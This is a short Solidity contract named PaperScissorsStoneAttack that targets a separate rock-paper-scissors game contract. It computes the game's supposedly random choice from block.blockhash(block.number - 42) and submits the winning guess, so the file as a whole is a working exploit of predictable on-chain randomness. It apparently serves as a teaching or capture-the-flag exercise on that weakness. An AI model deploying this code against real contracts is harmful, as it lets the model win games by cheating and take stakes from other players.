pragma solidity ^0.4.24;

import './PaperScissorsStone.sol';

contract PaperScissorsStoneAttack {
  PaperScissorsStone public paperScissorsStone;

  function PaperScissorsStoneAttack(address _paperScissorsStoneAddress) public {
    paperScissorsStone = PaperScissorsStone(_paperScissorsStoneAddress);
  }

  function guessAttack() public {
    uint8 randomIndex = uint8(block.blockhash(block.number - 42)) % 3;
    paperScissorsStone.guess((randomIndex + 1) % 3);
  }
}
